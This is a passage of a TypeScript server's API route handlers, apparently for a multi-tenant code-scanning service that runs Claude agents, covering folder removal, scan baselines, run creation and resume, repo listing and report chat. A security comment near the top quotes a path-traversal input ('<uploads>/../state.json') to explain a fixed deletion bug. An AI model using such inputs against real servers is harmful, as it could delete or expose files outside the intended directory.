    if (method === 'POST' && path === '/api/sources/local/remove') {
      const body = await readBody(req);
      const p = String(body.path || '');
      const idx = ws!.sources.findIndex((s) => s.kind === 'local');
      if (idx < 0) return sendJson(res, 404, { error: 'No local folders connected.' });
      const local = ws!.sources[idx];
      // Path-traversal guard: `p` is client-controlled, and the old string-prefix check ran
      // BEFORE proving p matched a connected folder — `<uploads>/../state.json` passed the prefix test and
      // rmSync resolved the `..`. Delete ONLY (a) the path of an entry that IS in THIS workspace's connected
      // localRepos (the stored value, written by saveUploadedFolder — never the raw client string), and
      // (b) after resolve() confirms it is a strict subpath of THIS tenant's uploads dir. A path-connected
      // user folder (outside uploads) is removed from the list but never deleted from disk.
      const entry = (local.localRepos ?? []).find((r) => r.path === p);
      if (!entry) return sendJson(res, 404, { error: 'That folder is not connected.' });
      local.localRepos = (local.localRepos ?? []).filter((r) => r.path !== p);
      const tenantUploads = resolvePath(join(UPLOADS_DIR, safeSeg(session!.tenant) || 'org'));
      const target = resolvePath(entry.path);
      if (target.startsWith(tenantUploads + '/')) { try { rmSync(target, { recursive: true, force: true }); } catch { /* best-effort: drop the on-disk snapshot for an uploaded folder */ } }
      if (!local.localRepos.length) { ws!.sources.splice(idx, 1); persist(); return sendJson(res, 200, { source: null }); }
      local.detail = `${local.localRepos.length} folder(s) · read-only`;
      persist();
      return sendJson(res, 200, { source: publicSource(local) });
    }

    // Incremental re-scan: the New Full Scan summary line's BASELINE preview —
    // the newest usable earlier scan of this EXACT target set in the ACTING org (lineage index; org-scoped by path, so
    // another org's baseline is unreachable), which of its repos moved (ls-remote with the clone credential), the changed
    // file count (GitHub compare) and a cost estimate from the baseline's per-lane spend. `sel` = the same artifacts map
    // POST /api/runs takes (JSON). Read-only + fail-open: anything unreachable is reported as unknown. Never on /share.
    if (method === 'GET' && path === '/api/scan-baseline') {
      let sel: Record<string, unknown> = {};
      try { const raw = url.searchParams.get('sel'); const j = raw ? JSON.parse(raw) : {}; if (j && typeof j === 'object' && !Array.isArray(j)) sel = j as Record<string, unknown>; }
      catch { return sendJson(res, 400, { error: 'sel must be a JSON object of source id → artifact ids' }); }
      const srcs = ws!.sources;
      const gh = srcs.find((s) => s.kind === 'github'), giturl = srcs.find((s) => s.kind === 'giturl');
      // Every selected id must be one of THIS caller's connected artifacts — otherwise no baseline at all,
      // so guessed repo names / foreign folder paths cannot probe the org's lineage index.
      const noBaseline = (reason: string) => sendJson(res, 200, { baseline: null, reason, repos: { total: 0, changed: null, files: null, unknown: 0 }, estimate: null });
      const filt = resolveBaselineFilters(sel, srcs, (s) => sourceArtifacts(s).map((a) => a.id));
      if (!filt) return noBaseline('the selection includes a target that is not connected here');
      const targets = runTargets(filt, localNamesFor(srcs));
      if (!targets.length) return noBaseline('nothing selected');
      const orgKey = orgKeyFor(actingOrgId(session!), session!.tenant);
      if (!orgKey) return noBaseline('no org scope for scan lineage');
      const ghToken = gh && filt.repoFilter?.length ? await tokenForRun(gh).catch(() => undefined) : undefined;
      const access = [
        ...(filt.repoFilter ?? []).map((n) => { const r = (gh?.repos ?? []).find((x) => x.fullName === n); return r ? { fullName: r.fullName, cloneUrl: r.cloneUrl, token: ghToken } : null; }),
        ...(filt.giturlFilter ?? []).map((n) => { const r = (giturl?.giturlRepos ?? []).find((x) => x.fullName === n); return r ? { fullName: r.fullName, cloneUrl: r.cloneUrl } : null; }),
      ].filter((x): x is { fullName: string; cloneUrl: string; token?: string } => !!x);
      // The planner's strict-compat inputs for THIS form (brief + memory recall + codeintel, the code
      // revision hash, a manual bundle pick). The pinned org-memory version is unknowable before the run, so with a
      // memory backend + recall on the inputs signature is not compared here (null).
      const qBrief = String(url.searchParams.get('brief') ?? '').trim().slice(0, 8000) || undefined;
      const qMemory = url.searchParams.get('memoryRecall') === '1';
      const qCodeintel = runCodeintelChoice(url.searchParams.get('codeintel') === '0' ? false : true, RUN_MODE === 'agentic');
      const qBundles = String(url.searchParams.get('bundles') ?? '').split(',').map((x) => x.trim()).filter((id) => EXPERT_BUNDLES.some((b) => b.id === id));
      const reg = registryHashes();
      const compat = { codeHash: reg.codeHash, inputsSig: qMemory && memoryEnabled() && memoryPushEnabled() ? null : inputsSigOf({ brief: qBrief, useMemory: qMemory, codeintel: qCodeintel }, null), manualBundles: qBundles.length ? qBundles : null, bundleHashes: reg.bundleHashes };
      const info = await scanBaselineInfo(orgKey, targetKeyFor(targets), access, {
        headSha: (r) => remoteHeadSha(r.cloneUrl, r.token),
        compare: (r, a, b) => githubCompareFiles(r, a, b),
        fileAt: (r, sha, p) => githubFileAt(r, sha, p),
        compat,
        lanes: (id) => (loadCheckpoint(id, 'barrier')?.payload?.lanes ?? loadCheckpoint(id, 'frontier')?.payload?.lanes ?? {}),
        runExists: (id) => { const r = runInActingOrg(session!, id); return !!r && !r.trashed; },
      });
      const bRun = info.baseline ? runInActingOrg(session!, info.baseline.runId) : undefined;
      return sendJson(res, 200, { ...info, ...(info.baseline && bRun?.alias ? { baseline: { ...info.baseline, alias: bRun.alias } } : {}) });
    }

    if (method === 'POST' && path === '/api/runs') {
      const body = await readBody(req);
      // ── RESUME FROM CHECKPOINT — creates a NEW child run whose
      // inputs are PINNED to the parent's; cached cuts replay, the rest executes live. The parent stays
      // immutable (its reports/share/audit history are keyed by its id); a non-complete parent is marked
      // supersededBy. Validation is FAIL-CLOSED; per-bundle reuse is honored with a barrier clamp.
      const rf = (body.resumeFrom && typeof body.resumeFrom === 'object') ? body.resumeFrom as { runId?: unknown; checkpoint?: unknown; reuseBundles?: unknown } : null;
      if (rf) {
        if (RUN_MODE !== 'agentic') return sendJson(res, 400, { error: 'resume requires agentic run mode' });
        const parent = runInActingOrg(session!, String(rf.runId || ''));   // acting-org-scoped: a cross-org parent resolves to undefined → 404 below (closes the resume-path cross-org leak — parent org == acting org, so the pinned snapshot is the SAME org)
        if (!parent) return sendJson(res, 404, { error: 'parent run not found' });
        if (!ckptEligible(parent)) return sendJson(res, 400, { error: 'this run kind has no resumable checkpoints' });
        if (parent.status === 'running') return sendJson(res, 400, { error: 'the parent run is still running — stop it (or let it finish) before resuming from its checkpoints' });   // direct-API guard (the UI already hides this); a live parent keeps writing cuts + supersededBy would be misleading
        if (parent.status === 'queued') return sendJson(res, 400, { error: 'the parent run is still queued — it has not started, so it has no checkpoints to resume from' });   // a queued run never executed → no cuts; don't treat it as resumable
        const parentCks = effectiveCheckpoints(parent);   // self-heals the index from the sidecar files
        const reqCkpt = String(rf.checkpoint || '') as CkptId;
        const meta = parentCks.find((c) => c.id === reqCkpt);
        if (!meta) return sendJson(res, 400, { error: 'checkpoint not found on the parent run' });
        if (reqCkpt === 'combined') return sendJson(res, 400, { error: 'the combined checkpoint is terminal — nothing downstream to resume' });
        const compat = checkpointCompat(parent.id, meta);
        if (compat.status === 'incompatible') return sendJson(res, 400, { error: `checkpoint incompatible: ${compat.why}` });
        if (!apiKeyStatus().ready) return sendJson(res, 400, { error: NO_CLAUDE_KEY });
        // FREEZE org + source snapshot BEFORE the first await (TOCTOU): runInActingOrg validated `parent`
        // against the acting org synchronously, but the plane-continuity check below awaits resolveSecretValue —
        // a concurrent acting-org switch / queue-claim on this session could swap session.actingOrgId + ws!.sources
        // during that await. Capture org + snapshot NOW and use them consistently for continuity, orgId, and the
        // pin, so a resume child can never be validated against one org's sources but pinned to another's.
        const resumeOrgId = parent.orgId ?? orgIdForTenant(parent.tenant);
        // A resume replays the PARENT's plane/box selection — scope the snapshot to it BEFORE the plane-continuity
        // + OSV parity checks, so they compare the parent against exactly what this child may mount. An older parent
        // (null filters) keeps its legacy all-planes set, which is what it actually measured with.
        const resumeSel = { planeFilter: parent.planeFilter ?? null };
        const resumeScoped = scopeSourcesToSelection(ws!.sources, resumeSel);
        const resumePinnedSources = resumeScoped.map(persistableSource);
        const resumeBoundSources = structuredClone(resumeScoped);
        const resumeMeasureSet = [...resumeBoundSources, ...envMcpSources()];
        // Load payloads up to the requested cut, CONTIGUOUSLY: checkpoint writes are
        // fail-open, so the chain can have holes (e.g. 'barrier' failed to write but 'findings' landed).
        // Replaying a cut past a hole would mix live re-runs with stale downstream payloads — so the first
        // missing / incompatible / unreadable cut BREAKS the chain, and everything at or beyond it re-runs:
        // the resume CLAMPS to the last contiguous cut. 'frontier' alone is optional in the walk — 'barrier'
        // subsumes it once all lanes land (the parent drops the frontier row then), so its absence is no hole.
        const data: Partial<Record<CkptId, any>> = {};
        let lastContiguous: CkptId | null = null;
        for (const id of CKPT_ORDER) {
          if (ckptRank(id) > ckptRank(reqCkpt)) break;
          const row = parentCks.find((c) => c.id === id);
          const loaded = (row && checkpointCompat(parent.id, row).status !== 'incompatible') ? loadCheckpoint(parent.id, id) : null;
          if (loaded) { data[id] = loaded.payload; lastContiguous = id; continue; }
          if (id === 'frontier') continue;   // subsumed by 'barrier' — absence is not a hole
          break;                             // hole → nothing at or beyond this rank may be reused
        }
        if (!data.workspace?.manifest?.repos?.length && !data.workspace?.manifest?.localDirs?.length) return sendJson(res, 400, { error: 'the parent run has no workspace manifest — cannot rebuild the workspace' });
        if (!lastContiguous) return sendJson(res, 400, { error: 'no usable checkpoint chain on this run — nothing to resume from' });
        const contiguousCkpt: CkptId = ckptRank(lastContiguous) < ckptRank(reqCkpt) ? lastContiguous : reqCkpt;
        const badBundle = ((data.comprehend?.bundleIds ?? []) as string[]).find((id) => !EXPERT_BUNDLES.some((b) => b.id === id));
        if (badBundle) return sendJson(res, 400, { error: `bundle '${badBundle}' is no longer registered — resume from the workspace checkpoint instead` });
        // Per-bundle reuse: default = every lane in the cut. Unticking a lane forces it to re-run, which
        // invalidates everything after the barrier → clamp the effective cut further (the UI states this).
        const laneMap = ((data.barrier?.lanes ?? data.frontier?.lanes ?? {}) as Record<string, LaneSnap>);
        const lanesAvail = Object.keys(laneMap);
        const reuseReq = Array.isArray(rf.reuseBundles) ? new Set((rf.reuseBundles as unknown[]).map(String)) : null;
        const reuse = new Set(lanesAvail.filter((id) => !reuseReq || reuseReq.has(id)));
        const ckpt: CkptId = (ckptRank(contiguousCkpt) > ckptRank('barrier') && reuse.size < lanesAvail.length) ? 'barrier' : contiguousCkpt;
        // PLANE CONTINUITY: when the comprehend payload is REUSED and measuring
        // stages re-run (any cut at/below the barrier), the EXACT measure planes the parent mounted —
        // by coordinate fingerprint, not kind (a swapped-in staging warehouse must not pass for the
        // prod one the parent measured) — must still resolve. Fail-closed. A 'workspace' resume
        // re-runs Comprehend itself and derives planes fresh, so there is no continuity to hold.
        if (ckpt !== 'workspace' && ckptRank(ckpt) <= ckptRank('barrier')) {
          const recorded = ((data.comprehend?.planes ?? []) as { kind: string; serverName: string; fp: string }[]);
          const liveByFp = new Map(measurePlaneIdentities(resumeMeasureSet).map((p) => [p.fp, p]));
          const missing = recorded.filter((p) => !liveByFp.has(p.fp));
          if (missing.length) return sendJson(res, 400, { error: `the parent run measured against ${missing.map((p) => `${p.serverName} (${p.kind})`).join(' + ')} — that exact plane is no longer connected; reconnect it (Connect) or resume from a later checkpoint` });
          // OSV availability parity: OSV is a measure plane but DERIVED (no coordinate
          // identity to fingerprint), so compare its availability BOOLEAN: the parent's recorded `osv`
          // (comprehend payload, additive field) vs what THIS child would mount — the public-only-scope
          // predicate over the PINNED filters + current sources, or the THERESA_OSV opt-in. Fail-closed,
          // same contract as the coordinate planes: a re-running lane must not measure with a different
          // advisory-plane set than the cached lanes. Older parents (no boolean) skip — warn-only path.
          const parentOsv = (data.comprehend as { osv?: boolean } | undefined)?.osv;
          if (typeof parentOsv === 'boolean') {
            // Predict the child's ACTUAL mount (osvWouldMount — allow predicate AND the `osv` name-collision
            // that mergeAgentTools would skip), over the PINNED parent filters + the CURRENT source list, so
            // the parity check mirrors what the mount site records, never just the allow.
            const childOsv = osvWouldMount(parent, resumeMeasureSet);
            if (childOsv !== parentOsv) {
              return sendJson(res, 400, { error: parentOsv
                ? 'the parent run measured with the OSV advisory plane, which this resume would NOT mount (a GitHub source was connected since, or THERESA_OSV changed) — restore the parent\'s conditions or resume from a later checkpoint'
                : 'this resume would mount the OSV advisory plane the parent never had (scope / THERESA_OSV changed) — re-run lanes would not be comparable with the cached ones; match the parent\'s conditions or start a fresh run' });
            }
          }
        }
        const metaEff = parentCks.find((c) => c.id === ckpt) ?? meta;
        const run: Run = {
          id: 'rs_' + randomBytes(8).toString('hex'), tenant: session!.tenant, mode: RUN_MODE,
          targetName: parent.targetName, repoFilter: parent.repoFilter, projectFilter: parent.projectFilter, localFilter: parent.localFilter ?? null, giturlFilter: parent.giturlFilter ?? null,
          planeFilter: resumeSel.planeFilter,
          invariantKeys: parent.invariantKeys ?? null, bundles: parent.bundles ?? null,
          // Init 'queued' (not 'running') so it goes through the SAME heavy-run promoter as a fresh Full Scan —
          // otherwise a resume could execute concurrently with another heavy run, violating CAP=1.
          status: 'queued', log: [], reportHtml: null, findings: 0, costUsd: null,
          // Pin the PARENT's org: a resume replays the parent's org-computed checkpoints, so it must run
          // against the parent's org even if the user has since switched acting-orgs. Fall back to the
          // current acting org only for a pre-seam parent that never captured an orgId.
          orgId: resumeOrgId ?? undefined, brief: parent.brief, createdAt: new Date().toISOString(), createdBy: session!.who,
        };
        run.useMemory = parent.useMemory !== false;
        if (parent.siblingRecall === true) run.siblingRecall = true;   // cross-project memory: a resume inherits the parent's sibling-recall choice
        run.scopeLabel = parent.scopeLabel;   // A resumed child keeps the user's Scope label
        run.codeintel = runCodeintelChoice(parent.codeintel, run.mode === 'agentic');   // inherit the parent's per-run codeintel/provenance choices on resume (only where the plane exists)
        run.docRecovery = parent.docRecovery === true;
        run.renamed = parent.renamed;   // keep the parent's display title (auto title-gen is skipped for resumes)
        run.resumedFrom = { runId: parent.id, checkpoint: ckpt };
        run.reusedCostUsd = metaEff.spentUsd;
        liveRun(run).resumeSpec = { parentId: parent.id, parentLabel: parent.alias || parent.id, ckpt, reuse, data };
        // SELF-CONTAINED SOURCE SNAPSHOT (cross-org leak fix): pin the acting org's sources onto the resume run too.
        // The resume rebuilds its workspace from the parent's pinned MANIFEST (tokenless public pins + private pins
        // cloned with this snapshot's github token), and executeOrgRun reads only the snapshot — so a mid-flight
        // acting-org switch can't swap another org's github token / planes under a queued resume.
        run.pinnedSources = resumePinnedSources;
        liveRun(run).boundSources = resumeBoundSources;   // → liveRun(run).boundSources: the pinned execution snapshot
        liveRun(run).authToken = session!.authToken;   // BYO credential lives in the side-table, never on the run record
        if (parent.status !== 'complete') parent.supersededBy = run.id;
        store.putRun(run); persist();
        const clampWhy = ckpt === reqCkpt ? '' : ckptRank(contiguousCkpt) < ckptRank(reqCkpt)
          ? ` (clamped from ${reqCkpt}: the checkpoint chain has a hole after ${ckpt})`
          : ` (clamped from ${reqCkpt}: ${lanesAvail.length - reuse.size} lane(s) re-run)`;
        pushLog(run, `↻ resume from ${parent.alias || parent.id} @ ${ckpt}${clampWhy} · reusing ${reuse.size}/${lanesAvail.length || '—'} lane(s)`);
        // A RESUME is a HEAVY run — route it through the SAME promoter (CAP=1) as a fresh Full Scan, so it can't
        // execute concurrently with another heavy run on this single box. Its replay context (resumeSpec) is
        // in-memory only; a resume left 'queued' across a restart is reaped to 'error' (the user re-triggers) —
        // identical to any queued run. A queued resume promoted later re-invokes executeOrgRun with the live
        // resumeSpec (same in-memory Run object), and startHeavyRun's rebind validates its source binding first.
        admitHeavyRun(run, () => executeOrgRun(run, inProcessCtx).catch((e) => failRun(run, String(e))));
        return sendJson(res, 200, { id: run.id, resumedFrom: run.resumedFrom });
      }
      const sel = (body.artifacts && typeof body.artifacts === 'object') ? body.artifacts as Record<string, unknown> : {};
      const gh = ws!.sources.find((s) => s.kind === 'github');
      const local = ws!.sources.find((s) => s.kind === 'local');
      const giturl = ws!.sources.find((s) => s.kind === 'giturl');
      const repoFilter = gh && Array.isArray(sel[gh.id]) ? (sel[gh.id] as unknown[]).map(String) : null;
      const projectFilter = null;
      const localFilter = local && Array.isArray(sel[local.id]) ? (sel[local.id] as unknown[]).map(String) : null;
      const giturlFilter = giturl && Array.isArray(sel[giturl.id]) ? (sel[giturl.id] as unknown[]).map(String) : null;
      const nRepo = repoFilter ? repoFilter.length : 0; const nLocal = localFilter ? localFilter.length : 0; const nGit = giturlFilter ? giturlFilter.length : 0;
      if (!nRepo && !nLocal && !nGit) return sendJson(res, 400, { error: 'Select at least one repository, folder or public URL.' });
      // Data planes / exec boxes / memory recall are EXPLICIT per-run choices, validated here against the acting
      // org's connected sources (the server is the boundary; the form's ticks are only a request). Contract + legacy
      // (absent-field) semantics: src/run/planeSelection.ts.
      const planeSel = parsePlaneSelection(body, ws!.sources);
      if (!planeSel.ok) return sendJson(res, 400, { error: planeSel.error });
      const sibSel = parseSiblingRecall(body);
      if (!sibSel.ok) return sendJson(res, 400, { error: sibSel.error });
      // Mandatory BYO applies ONLY to runs that actually invoke Claude — agentic mode with code
      // (repos / local folders / public-URL repos) to analyze. GCP-only and deterministic runs use no Claude.
      const usesClaude = RUN_MODE === 'agentic' && (nRepo > 0 || nLocal > 0 || nGit > 0);
      if (usesClaude && !apiKeyStatus().ready) return sendJson(res, 400, { error: NO_CLAUDE_KEY });
      // Singular/plural counts — targetName becomes the run title ("Full Scan · 1 repo · 2 folders"), never "1 repos".
      const cnt = (n: number, one: string): string => `${n} ${one}${n === 1 ? '' : 's'}`;
      const parts: string[] = []; if (nRepo) parts.push(cnt(nRepo, 'repo')); if (nGit) parts.push(cnt(nGit, 'public repo')); if (nLocal) parts.push(cnt(nLocal, 'folder'));
      const brief = String(body.brief || '').trim().slice(0, 8000) || undefined; // user-stated run brief (optional); bounded to 8000 chars — it flows into the agent prompts
      // invariants the user selected in the UI (validated against the known set). An EXPLICIT empty selection
      // (the UI sends [] when you untick everything) is rejected for a code run — distinct from ABSENT (an API
      // call with no field), which auto-selects (all general + ranking-if-detected).
      const invariantKeys = Array.isArray(body.invariants) ? (body.invariants as unknown[]).map(String).filter((k) => ALL_INVARIANTS.some((i) => i.key === k)) : null;
      if (invariantKeys && !invariantKeys.length && (nRepo || nLocal || nGit)) return sendJson(res, 400, { error: 'Select at least one invariant to check.' });
      // Manually-selected expert bundles (agentic runs): keep only registered ids; empty ⇒ null ⇒ auto (Comprehend picks).
      const bundleSel = Array.isArray(body.bundles) ? (body.bundles as unknown[]).map(String).filter((id) => EXPERT_BUNDLES.some((b) => b.id === id)) : null;
      // capture the kicking-off user's pasted Claude credential so the run's agents bill to it (in-memory only)
      // Initialize 'queued' (not 'running'): the heavy-run promoter's admit() is the single place that flips a
      // Full Scan to 'running' (and starts it) or keeps it parked — starting it as 'running' here would make it
      // count itself against the cap in heavyRunsInFlight() and never start.
      const run: Run = { id: 'rs_' + randomBytes(8).toString('hex'), tenant: session!.tenant, mode: RUN_MODE, targetName: parts.join(' · '), repoFilter, projectFilter, localFilter, giturlFilter, invariantKeys: invariantKeys && invariantKeys.length ? invariantKeys : null, bundles: bundleSel && bundleSel.length ? bundleSel : null, status: 'queued', log: [], reportHtml: null, findings: 0, costUsd: null, orgId: wsOrg, brief, createdAt: new Date().toISOString(), createdBy: session!.who };
      // SELF-CONTAINED SOURCE SNAPSHOT (cross-org leak fix): pin the acting org's sources onto the run NOW, at
      // create, while t.sources is authoritatively this run's org. pinnedSources = non-secret form (persisted, refs
      // resolved per-run); boundSources = the in-memory execution set (deep copy carrying any raw pasted tokens).
      // executeOrgRun reads ONLY this snapshot, so a later acting-org switch / claim / connect can't leak another
      // org's planes into this (possibly-queued) run.
      // The snapshot is SCOPED to the explicit plane/box selection, so an unticked data plane never enters it.
      run.planeFilter = planeSel.planeFilter;
      const scopedSources = scopeSourcesToSelection(ws!.sources, planeSel);
      run.pinnedSources = scopedSources.map(persistableSource);
      liveRun(run).boundSources = structuredClone(scopedSources);   // → liveRun(run).boundSources: pin the acting org's (selected) sources onto THIS run
      liveRun(run).authToken = session!.authToken;   // BYO credential lives in the side-table, never on the run record
      run.useMemory = planeSel.memoryRecall;   // Org-memory recall is an explicit per-run choice (body.memoryRecall; legacy useMemory:true honored)
      for (const n of planeSel.notes) pushLog(run, `ⓘ ${n}`);
      if (planeSel.notes.length) console.log(JSON.stringify({ severity: 'WARNING', component: 'run', run: run.id, tenant: run.tenant, event: 'run-request-selection-defaulted', notes: planeSel.notes }));
      pushLog(run, selectionSummary(ws!.sources, planeSel, run.useMemory));
      run.scopeLabel = String(body.scopeLabel ?? '').trim().slice(0, 120) || undefined;   // The form's Scope label (display-only)
      run.writeMemory = body.writeMemory === true; // per-run "Draft memory from reports" tick (UI, default OFF) — gates the post-run finishRun memory-draft hook (also gated by ACCEL_MEMORY_WRITE_ENABLED)
      run.codeintel = runCodeintelChoice(body.codeintel, run.mode === 'agentic');    // per-run "Code intelligence" toggle (UI, default ON when THERESA_CODEINTEL available) — recorded true only where the plane exists
      run.docRecovery = body.docRecovery === true;  // per-run "Design & evolution report" tick (UI, default OFF, LLM-cost opt-in) — effective only when docRecoveryEnabled()
      // Incremental re-scan: the form's "Full rescan" tick (default off = incremental when a baseline qualifies). Persisted,
      // so a queued run keeps the choice; the plan itself is made at execute time (src/run/incrementalRun.ts).
      if (body.fullRescan === true) run.fullRescan = true;
      if (sibSel.siblingRecall) { run.siblingRecall = true; pushLog(run, "ⓘ sibling recall on — facts from this org's other projects are given to the Critic + Expert as CONTRAST (verify, do not assume)"); }
      store.putRun(run);
      // Full Scan is a HEAVY run — route through the promoter (run-level cap). admit() persists after deciding
      // 'running' (start now) vs 'queued' (park for pump()); everything executeOrgRun needs is already on `run`,
      // so a later pump() promotion re-invokes it with no request closure.
      admitHeavyRun(run, () => executeOrgRun(run, inProcessCtx).catch((e) => failRun(run, String(e))));
      return sendJson(res, 200, { id: run.id });
    }

    // Repo universe for the Ask-tab selector: the acting org's profile repos (pre-checked) + every repo in the
    // relevant org(s) the profile PAT can read (the folded "full org" list). Enumerated via listOrgRepos
    // (works for outside-collaborator tokens, unlike /user/repos). Falls back to just the defaults if no token.
    if (method === 'GET' && path === '/api/ask/repos') {
      const ts2 = sessionWs(session!);
      const gh = ts2.sources.find((s) => s.kind === 'github');
      const token = gh ? await tokenForRun(gh) : undefined;
      const defaultSet: { fullName: string; branch?: string }[] = [];
      // Enumerate the full org universe from the ACTUAL connection — the owners of the connected github
      // repos (gh.repos) ∪ the profile defaults (never a hardcoded org set).
      const orgs = [...new Set([...defaultSet, ...(gh?.repos ?? [])].map((r) => r.fullName.split('/')[0]).filter(Boolean))];
      const all: { fullName: string; private: boolean; pushedAt?: string }[] = [];
      const names = new Set<string>();
      // `enumerated` must report whether the full-org listing ACTUALLY succeeded, not merely that a token
      // existed: listOrgRepos can throw (cold instance, rate limit, transient auth) and the catch swallows it,
      // which would otherwise return enumerated:true with only the defaults — and the client would cache that
      // degraded list permanently. Flip it true only when a listing call returns without throwing.
      // `enumerated` is true only when EVERY attempted org listed without throwing — a partial multi-org
      // result (org A ok, org B rate-limited) reports false so the client treats it as a transient miss and
      // re-fetches next open instead of caching a partial as final. Single-org today, so this == "the one
      // listOrgRepos succeeded"; the stricter form just future-proofs fan-out.
      let enumAttempted = 0, enumSucceeded = 0;
      if (token) {
        for (const org of orgs) {
          enumAttempted++;
          try { const repos = await listOrgRepos(token, org); enumSucceeded++; for (const r of repos) if (!names.has(r.fullName)) { names.add(r.fullName); all.push({ fullName: r.fullName, private: r.private, pushedAt: r.pushedAt }); } }
          catch { /* skip an org we can't enumerate (this org's miss keeps enumerated=false) */ }
        }
      }
      const enumOk = enumAttempted > 0 && enumSucceeded === enumAttempted;
      for (const r of (gh?.repos ?? [])) if (!names.has(r.fullName)) { names.add(r.fullName); all.push({ fullName: r.fullName, private: r.private, pushedAt: r.pushedAt }); }   // the connected repo universe (survives a listOrgRepos miss)
      for (const d of defaultSet) if (!names.has(d.fullName)) { names.add(d.fullName); all.push({ fullName: d.fullName, private: true }); }   // defaults always present
      all.sort((a, b) => (b.pushedAt || '').localeCompare(a.pushedAt || ''));
      // `orgs` lets the client scope its cross-tab full-org sharing to the SAME org universe (a Quick Ask
      // and a Recsys Audit that enumerate different orgs must not borrow each other's lists).
      // Quick Ask's two extra picker groups (never pre-ticked): the connected Public GitHub URL source's repos (cloned
      // tokenless when their fullName is in POST /api/ask `repos`) and the connected local / uploaded folders (opaque
      // ids for POST /api/ask `localFolders` — never a filesystem path).
      const publicRepos = [...new Set(ts2.sources.filter((s) => s.kind === 'giturl').flatMap((s) => (s.giturlRepos ?? []).map((r) => r.fullName)))];
      return sendJson(res, 200, { defaults: defaultSet.map((r) => (r.branch ? `${r.fullName}@${r.branch}` : r.fullName)), all, enumerated: enumOk, orgs, public: publicRepos, local: askLocalFolderList(ts2.sources) });
    }

    // ── Report chat assistant ──
    // Tenant-scoped conversations; each turn is grounded in the OPEN report (context.report.runId) and runs
    // TOOL-FREE / lightweight (see chat.ts). BYO Claude required when this instance has no shared key.
    if (method === 'GET' && path === '/api/chat/conversations') {
      return sendJson(res, 200, { conversations: listConversations(session!.tenant) });
    }
    {
      const cm = path.match(/^\/api\/chat\/conversations\/([\w-]+)$/);
      if (cm && (method === 'GET' || method === 'DELETE')) {
        if (method === 'GET') { const conv = getConversation(session!.tenant, cm[1]); if (!conv) return sendJson(res, 404, { error: 'not found' }); return sendJson(res, 200, { conversation: conv }); }
        const ok = deleteConversation(session!.tenant, cm[1]);
        if (ok) wipeChatWorkspace(chatKey(session!.tenant, cm[1]));   // wipe only the caller's OWN workspace, after the ownership check
        return sendJson(res, 200, { ok });
      }
    }
    if (method === 'POST' && path === '/api/chat') {
      const body = await readBody(req);
      const message = String(body.message || '').trim().slice(0, 8000);
      if (!message) return sendJson(res, 400, { error: 'Type a question first.' });
      // Managed-key bypass: the dashboard proxy (service session) runs on this instance's ambient Claude key,
      // so the BYO gate doesn't apply to it. Cookie (console) sessions still require their pasted token.
      if (!apiKeyStatus().ready) return sendJson(res, 428, { error: NO_CLAUDE_KEY });
      const tenant = session!.tenant;
      const rep = (body.context && body.context.report && typeof body.context.report === 'object') ? body.context.report : null;
      const reportRunId = rep && typeof rep.runId === 'string' ? String(rep.runId) : undefined;
      const directHtml = rep && typeof rep.html === 'string' ? rep.html : undefined;   // dashboard proxy passes the report HTML inline
      const pinId = reportRunId || (rep && typeof rep.id === 'string' ? String(rep.id) : undefined);   // per-turn provenance tag
      const clip = (s: string, n: number) => (s.length > n ? s.slice(0, n) + ' …(truncated)' : s);
      // Extract the report's embedded datapoints / work-items (else a stripped text digest) from its HTML —
      // shared by both the inline (dashboard) and the stored-report (console) paths.
      const fromHtml = (html: string, parts: string[]) => {
        const dm = html.match(/__ACCEL_DATA__\s*=\s*(\{[\s\S]*?\})\s*;?\s*<\/script>/);
        const wm = html.match(/__ACCEL_WORKITEMS__\s*=\s*(\[[\s\S]*?\])\s*;?\s*<\/script>/);
        if (dm) parts.push(`\n[Report datapoints JSON]\n${clip(dm[1], 6000)}`);
        if (wm) parts.push(`\n[Work items JSON]\n${clip(wm[1], 4000)}`);
        if (!dm) { const txt = html.replace(/<script[\s\S]*?<\/script>/g, ' ').replace(/<style[\s\S]*?<\/style>/g, ' ').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim(); if (txt) parts.push(`\n[Report text]\n${clip(txt, 8000)}`); }
      };
      // Pinned-report grounding. Read-only; best-effort (never throws into the stream).
      let reportContext: string | undefined;
      if (directHtml) {
        // Direct path (dashboard proxy): the report lives in the dashboard's own store, not accel's run map,
        // so the HTML is passed inline — we only re-extract what the (already org-authorized) caller sent;
        // no cross-tenant store is touched. Bounded to keep the prompt sane.
        const parts: string[] = [];
        const title = rep && typeof rep.title === 'string' ? String(rep.title).slice(0, 300) : undefined;
        const scope = rep && typeof rep.scope === 'string' ? String(rep.scope).slice(0, 300) : undefined;
        if (title) parts.push(`Report: ${title}`);
        if (scope) parts.push(`Scope: ${scope}`);
        fromHtml(clip(directHtml, 200000), parts);
        reportContext = parts.join('\n') || undefined;
      } else if (reportRunId) {
        // Tenant-scoped lookup (console cookie session): a foreign/unknown reportRunId yields no run → no
        // context. The report is loaded ONLY inside this guard, by run.id — loadReport keys purely by id with
        // NO tenant scope, so calling it on the client-supplied reportRunId directly would leak another
        // tenant's report content. UI/run-id obscurity is not the isolation boundary.
        const run = store.getRun(tenant, reportRunId);   // run access via the Store (was tstate(tenant).runs.get — same tenant-scoped lookup)
        const parts: string[] = [];
        if (run) {
          parts.push(`Report: ${run.targetName || run.id}`);
          const sc = run.askScope || run.auditScope; if (sc) parts.push(`Scope: ${sc}`);
          if (run.askQuestion) parts.push(`Question investigated: ${run.askQuestion}`);
          if (run.askAnswer) parts.push(`\nAnswer (from the report):\n${run.askAnswer}`);
          const html = loadReport(run.id);
          if (html) fromHtml(html, parts);
        }
        reportContext = parts.join('\n') || undefined;
      }
      let conv = body.convId ? getConversation(tenant, String(body.convId)) : null;
      if (body.convId && !conv) return sendJson(res, 404, { error: 'conversation not found' });
      if (!conv) conv = createConversation(tenant, message, session!.who);
      const history = conv.messages.filter((m) => !m.partial).map((m) => ({ role: m.role, text: m.text }));
      appendMessage(conv, { role: 'user', text: message, reportRunId: pinId });
      const asst = appendMessage(conv, { role: 'assistant', text: '', partial: true, reportRunId: pinId });
      res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', connection: 'keep-alive' });
      sse(res, 'conv', JSON.stringify({ convId: conv.id, title: conv.title, messageId: asst.id }));
      const ac = new AbortController();
      req.on('close', () => ac.abort());
      const ALLOWED_CHAT_MODELS = ['claude-opus-4-8', 'claude-sonnet-4-6', 'claude-haiku-4-5-20251001'];
      const model = (typeof body.model === 'string' && ALLOWED_CHAT_MODELS.includes(body.model)) ? body.model : undefined;
